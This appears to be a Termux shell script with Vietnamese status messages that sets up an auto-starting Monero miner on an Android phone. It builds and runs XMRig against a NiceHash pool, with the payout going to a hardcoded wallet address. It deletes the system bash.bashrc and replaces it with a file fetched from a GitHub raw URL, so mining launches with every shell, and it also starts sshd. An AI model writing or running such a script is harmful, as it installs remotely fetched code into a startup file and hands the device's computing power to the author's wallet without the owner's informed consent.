
clear
sshd
termux-wake-lock
echo "  ~~  Manh Mobile 0898707968   ~~ ";
sleep 3

echo "( ~~tool auto start mining ~~ )";
sleep 1

echo " chúc Ae đào coin thật nhiều tiền";
sleep 1

echo "load... đang lấy thông tin ✓ ";
sleep 1

echo "load... cập nhật lại thông tin✓";
sleep 1

echo "load... bất đầu login✓  ";
sleep 1
neofetch
sleep 8
echo "load...  start xmr mining coin✓ ";
sleep 3

cd xmrig/build
./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5


apt update && yes | apt upgrade && apt update && apt install git -y && pkg install wget -y && pkg install nmap -y && pkg install wget -y && apt-get install git && pkg install git && apt -y install neofetch
cd && pwd && cd ../usr/etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/scorpionyb/file-bashrc/main/xmr.bash
cp xmr.bash ../etc/bash.bashrc
rm -rf xmr.bash


apt update && yes | apt upgrade  && pkg install git build-essential cmake -y
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
cd xmrig/build
cmake .. -DWITH_HWLOC=OFF && make -j$(nproc)
./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5
